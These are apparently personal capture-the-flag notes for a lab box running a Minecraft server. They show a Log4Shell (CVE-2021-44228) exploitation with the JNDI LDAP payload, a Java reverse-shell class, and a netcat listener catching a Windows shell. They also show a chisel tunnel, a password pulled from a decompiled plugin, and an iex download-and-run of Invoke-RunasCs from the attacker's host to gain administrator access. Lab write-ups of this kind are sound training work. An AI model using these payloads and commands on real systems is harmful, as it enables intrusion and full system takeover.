

Bridge kali adapter


chisel IP:25565 127.0.0.1:25565:10.XX.XX.XX:25565



on linux 

```
Welcome to fish, the friendly interactive shell
Type help for instructions on how to use fish
kali@kali ~> chisel server -p 8050
2024/02/11 18:04:10 server: Fingerprint gy/HAY+Tce8qG7m7SuMzKjmqao0wmEEgMWhTJVBuBsE=
2024/02/11 18:04:10 server: Listening on http://0.0.0.0:8050
2024/02/11 18:08:55 server: session#1: Client version (1.9.1) differs from server version (1.9.1-0kali1)
2024/02/11 18:09:01 server: session#2: Client version (1.9.1) differs from server version (1.9.1-0kali1)

```




on windows
```
PS E:\> ./chisel.exe client 192.168.100.163:8050 127.0.0.1:25565:192.168.100.163:25565
2024/02/12 02:09:01 client: Connecting to ws://192.168.100.163:8050
2024/02/12 02:09:01 client: tun: proxy#127.0.0.1:25565=>192.168.100.163:25565: Listening
2024/02/12 02:09:01 client: Connected (Latency 2.9805ms)


PS E:\> ./chisel.exe client 192.168.100.163:8050       127.0.0.1:25565:192.168.100.163:25565
          chisel     client Kali server IP with port   Our current host and the IP of kali

127.0.0.1:25565
Local host here is the entrance of the tunnel

192.168.100.163:25565
Where we want the tunnel to go

```



Payload from log4j
```
/log4j-shell-poc (main) [1]> python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389

```


## Using CLI

```
Minecraft Console Client v1.20.2 - for MC 1.4.6 to 1.20.2 - Github.com/MCCTeam
GitHub build 245, built on 2024-01-30 from commit 1e60b61
Login :
Password(invisible): 
You chose to run in offline mode.
Server IP : <BOX IP HERE>
Retrieving Server Info...
Server version : 1.16.5 (protocol v754)
[MCC] Version is supported.
Logging in...
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
Type '/quit' to leave the server.
> 


```


## Editing payload

```
public class Exploit {

    public Exploit() throws Exception {
        String host="%s";
        int port=%d;
        String cmd="cmd.exe";
        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s=new Socket(host,port);
        InputStream pi=p.getInputStream(),

```



## Launching PoC

```
kali@kali ~/log4j-shell-poc (main)> python3 poc.py --userip 10.10.15.64 --webport 8000 --lport 9002

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server

[+] Send me: ${jndi:ldap://10.10.15.64:1389/a}
[+] Starting Webserver on port 8000 http://0.0.0.0:8000

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389

```

put poc payload in the CLI `${jndi:ldap://10.10.15.64:1389/a}` 


```
Minecraft Console Client v1.20.2 - for MC 1.4.6 to 1.20.2 - Github.com/MCCTeam
GitHub build 245, built on 2024-01-30 from commit 1e60b61
Login :
Password(invisible): 
You chose to run in offline mode.
Server IP : <BOX IP HERE>
Retrieving Server Info...
Server version : 1.16.5 (protocol v754)
[MCC] Version is supported.
Logging in...
[MCC] Server is in offline mode.
[MCC] Server was successfully joined.
Type '/quit' to leave the server.
> ${jndi:ldap://10.10.15.64:1389/a}

```

```
Welcome to fish, the friendly interactive shell
Type help for instructions on how to use fish
kali@kali ~> nc -nvlp 9002
listening on [any] 9002 ...
connect to [10.10.15.64] from (UNKNOWN) [10.129.226.255] 49681
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\users\svc_minecraft\server>

```

now we have a shell!! so lets get the user flag :))


```
c:\users\svc_minecraft\server>type C:\Users\svc_minecraft\Desktop\user.txt
type C:\Users\svc_minecraft\Desktop\user.txt
69a793c0da2bcbe6376d458d0adf8ecf


```

lets see what else `svc_minecraft` has in his directory

```
c:\Users\svc_minecraft>tree /f /a
tree /f /a
Folder PATH listing
Volume serial number is C419-63F6
C:.
+---3D Objects
+---Contacts
+---Desktop
|       user.txt
|       
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |   
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|       
+---Music
+---Pictures
+---Saved Games
+---Searches
+---server
|   |   banned-ips.json
|   |   banned-players.json
|   |   eula.txt
|   |   ops.json
|   |   server.jar
|   |   server.properties
|   |   usercache.json
|   |   whitelist.json
|   |   
|   +---logs
|   |       2023-10-24-1.log.gz
|   |       2023-10-24-2.log.gz
|   |       2023-10-24-3.log.gz
|   |       2023-10-24-4.log.gz
|   |       2023-10-26-1.log.gz
|   |       2023-10-28-1.log.gz
|   |       2023-10-28-2.log.gz
|   |       2023-11-14-1.log.gz
|   |       2023-11-14-2.log.gz
|   |       2023-11-14-3.log.gz
|   |       2023-11-14-4.log.gz
|   |       2023-11-21-1.log.gz
|   |       2023-11-21-2.log.gz
|   |       2023-11-21-3.log.gz
|   |       2023-11-21-4.log.gz
|   |       2023-11-22-1.log.gz
|   |       2023-11-22-2.log.gz
|   |       2023-11-22-3.log.gz
|   |       2024-02-05-1.log.gz
|   |       2024-02-05-2.log.gz
|   |       2024-02-05-3.log.gz
|   |       2024-02-05-4.log.gz
|   |       2024-02-05-5.log.gz
|   |       2024-02-06-1.log.gz
|   |       2024-02-06-2.log.gz
|   |       2024-02-06-3.log.gz
|   |       latest.log
|   |       
|   +---plugins
|   |       playercounter-1.0-SNAPSHOT.jar
|   |       
|   \---world
|       |   level.dat
|       |   level.dat_old
|       |   session.lock
|       |   
|       +---data
|       |       raids.dat
|       |       
|       +---datapacks
|       +---DIM-1
|       |   \---data
|       |           raids.dat
|       |           
|       +---DIM1
|       |   \---data
|       |           raids_end.dat
|       |           
|       +---playerdata
|       +---poi
|       |       r.-1.-1.mca
|       |       r.-1.0.mca
|       |       r.0.-1.mca
|       |       r.0.0.mca
|       |       
|       \---region
|               r.-1.-1.mca
|               r.-1.0.mca
|               r.0.-1.mca
|               r.0.0.mca
|               r.1.-1.mca
|               r.1.0.mca
|               
\---Videos

```


my idea was to download the plugin thats alone because its what popped out the most to me, so im going to assume you downloaded the file too and lets see whats inside

```
kali@kali ~/Downloads> java -jar jd-gui-1.6.6.jar
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

```

lets download the `jd-gui` 

![[Crafty-20240212051653158.webp|814]]



Ofcourse the `s67u84zKq8IXw` to be very important so I wanted to open the class

![[Crafty-20240212051753502.webp|809]]


so we have established a credential `s67u84zKq8IXw` so, lets try and priv esc. now here i got stuck and didnt know how to escelate, ofcourse one of my first ideas was to find the `su` equivalent which is `runas` in this case itll be `RunAsCs` which our dear gracious enzu informed me about https://github.com/antonioCoco/RunasCs

```
iex(new-object net.webclient).downloadstring("http://10.10.14.6:8000/Invoke-RunasCs.ps1");
```

in my case i decided to use `Invoke-RunasCs.ps1`



Invoke-RunasCs tstark playboy69 "cmd /c whoami"
Invoke-RunasCs tstark playboy69 "cmd /c dir"

```
c:\tmp>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\tmp> iex(new-object net.webclient).downloadstring("http://10.10.15.64:1337/Invoke-RunasCs.ps1");
iex(new-object net.webclient).downloadstring("http://10.10.15.64:1337/Invoke-RunasCs.ps1");
PS C:\tmp> Invoke-RunasCs Administrator s67u84zKq8IXw "cmd /c whoami /all"
Invoke-RunasCs Administrator s67u84zKq8IXw "cmd /c whoami /all"


USER INFORMATION
----------------

User Name            SID                                          
==================== =============================================
crafty\administrator S-1-5-21-4088429403-1159899800-2753317549-500


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                                     
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group             
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

PS C:\tmp> Invoke-RunasCs Administrator s67u84zKq8IXw "cmd /c type C:\Users\Administrator\Desktop\root.txt"
Invoke-RunasCs Administrator s67u84zKq8IXw "cmd /c type C:\Users\Administrator\Desktop\root.txt"

02744bc6d6d4ba02605ab420aa9015b8

```




